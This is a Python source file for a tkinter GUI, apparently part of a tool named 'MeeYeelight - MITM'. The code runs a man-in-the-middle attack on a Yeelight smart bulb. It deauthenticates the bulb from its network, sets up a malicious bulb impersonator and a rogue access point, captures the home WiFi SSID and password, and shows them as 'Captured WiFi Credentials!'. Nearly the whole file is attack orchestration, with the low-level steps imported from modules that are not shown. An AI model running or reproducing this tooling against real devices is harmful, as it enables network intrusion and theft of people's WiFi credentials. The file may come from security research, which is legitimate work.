import tkinter as tk
import time
import os
import json
from threading import *
from queue import Queue

from mitm.yeelight_connect import connect_to_yeelight
from mitm.deauth import Deauth
from hotspot.hotspot_controller import create_hotspot, create_malicious_yeelight, stop_hotspot
from hotspot.yeelight_socket import YeelightSocket


class GUI_MITM():
    def __init__(self, var):
        self._var = var
        self.root = tk.Tk(className="MeeYeelight - MITM")
        self.root.resizable(False, False)
        self.media_directory = os.getcwd() + "/media"
        self.queue = Queue()

        self.ssid = tk.StringVar()
        self.password = tk.StringVar()

        # Frames
        self.FRAME_deauth = tk.Frame(self.root, borderwidth=10)
        self.BTN_next = tk.Button(self.FRAME_deauth, text="Next", command=self.next_click, bg='#C5DDB6', width=25)
        self.LB_deauth_title = tk.Label(self.FRAME_deauth, text="MITM attack", font="bold")

        # MITM SUB_FRAME_deauth
        self.SUB_FRAME_deauth = tk.Frame(self.FRAME_deauth, pady=5)
        self.LB_deauth_yeelight = tk.Label(self.SUB_FRAME_deauth, text="⌛ Deauthenticating Yeelight ⌛")
        self.LB_connect_to_yeelight = tk.Label(self.SUB_FRAME_deauth, text="⌛ Connecting to Yeelight AP ⌛")
        self.LB_start_malicious_yeelight = tk.Label(self.SUB_FRAME_deauth, text="⌛ Starting Malicious Yeelight ⌛")
        self.LB_start_malicious_ap = tk.Label(self.SUB_FRAME_deauth, text="⌛ Starting Malicious AP ⌛")

        # WiFi Credentials SUB_FRAME_deauth
        self.SUB_FRAME_wifi = tk.Frame(self.FRAME_deauth, pady=5)
        self.LB_wifi_title = tk.Label(self.SUB_FRAME_wifi, text="Captured WiFi Credentials!", font="bold")
        self.LB_wifi_celebration = tk.Label(self.SUB_FRAME_wifi, text="☺", font="bold")
        self.LB_wifi_SSID = tk.Label(self.SUB_FRAME_wifi, text="SSID:")
        self.EN_wifi_SSID = tk.Entry(self.SUB_FRAME_wifi, textvariable=self.ssid, justify='center')
        self.LB_wifi_password = tk.Label(self.SUB_FRAME_wifi, text="Password:")
        self.EN_wifi_password = tk.Entry(self.SUB_FRAME_wifi, textvariable=self.password, justify='center')

        self.load_gui()

    def label_update(self, label):
        label['text'] = label['text'][:-1]
        label['text'] = label['text'][0:]
        label['text'] = "✔" + label['text'][1:] + "✔"
        self.root.update()


    def load_gui(self):
        self.FRAME_deauth.grid()
        self.LB_deauth_title.grid(row=1)
        self.SUB_FRAME_deauth.grid(row=2)
        self.SUB_FRAME_wifi.grid(row=3)

        self.root.update()

        # Deauth Yeelight out of main WLAN
        yeelight_deauth = Deauth()
        yeelight_deauth.start_deauth(self._var.interfaces["hotspot"],
            self._var.yeelight['mac'],
            self._var.ssid['mac'],
            self._var.ssid['channel'])
        self.LB_deauth_yeelight.grid()
        self.root.update()

        # Connect to Yeelight with attack interface
        self.LB_connect_to_yeelight.grid()
        self.root.update()
        thread_yeelight_connection = Thread(target=connect_to_yeelight,
            args=(self._var.malicious_yeelight['ssid'],
                self._var.interfaces['attack'],))
        thread_yeelight_connection.name = 'yeelight_connection'
        thread_yeelight_connection.setDaemon(True)
        thread_yeelight_connection.start()
        thread_yeelight_connection.join()
        yeelight_deauth.stop_deauth()
        self.label_update(self.LB_deauth_yeelight)
        self.label_update(self.LB_connect_to_yeelight)

        # Create Malicious Yeelight
        self.LB_start_malicious_yeelight.grid()
        self.root.update()
        thread_create_malicious_yeelight = Thread(target=create_malicious_yeelight, 
            args=(self._var.interfaces['malicious_yeelight'], 
                self._var.malicious_yeelight['ssid'], 
                self._var.malicious_yeelight['gateway'], 
                self._var.yeelight['mac'], ))
        thread_create_malicious_yeelight.name = 'create_malicious_yeelight'
        thread_create_malicious_yeelight.setDaemon(True)
        thread_create_malicious_yeelight.start()
        time.sleep(1)

        # Start Yeelight Connection Process
        yeelight_socket = YeelightSocket(self._var.interfaces['malicious_yeelight'],
                self._var.interfaces['attack'],
                self._var.malicious_yeelight['gateway'], 
                self._var.yeelight['mac'],
                self._var.hotspot['ssid'],
                self._var.hotspot['password'])
        yeelight_socket.start_socket(self.queue)
        self.label_update(self.LB_start_malicious_yeelight)

        # Create Malicious Access Point
        self.LB_start_malicious_ap.grid()
        self.root.update()
        time.sleep(3)
        thread_create_malicious_ap = Thread(target=create_hotspot, 
            args=(self._var.interfaces['hotspot'], 
                self._var.hotspot['ssid'],
                self._var.hotspot['password']))
        thread_create_malicious_ap.name = 'create_malicious_yeelight'
        thread_create_malicious_ap.setDaemon(True)
        thread_create_malicious_ap.start()
        self.label_update(self.LB_start_malicious_ap)
        self.root.update()

        while self.queue.empty():
            self.root.update()
        
        wifi_credentials = json.loads(self.queue.get())

        self.SUB_FRAME_deauth.grid_forget()
        
        self.BTN_next.grid(row=0)
        self.LB_wifi_title.grid()
        self.LB_wifi_celebration.grid()
        self.LB_wifi_SSID.grid()
        self.EN_wifi_SSID.grid()
        self.LB_wifi_password.grid()
        self.EN_wifi_password.grid()

        self.EN_wifi_SSID.delete(0, tk.END)
        self.EN_wifi_SSID.insert(0, str(wifi_credentials['params']['ssid']))
        self.EN_wifi_password.delete(0, tk.END)
        self.EN_wifi_password.insert(0, str(wifi_credentials['params']['passwd']))

        stop_hotspot(self._var.interfaces['malicious_yeelight'])

        self.root.mainloop()

    def next_click(self):
        self.root.destroy()
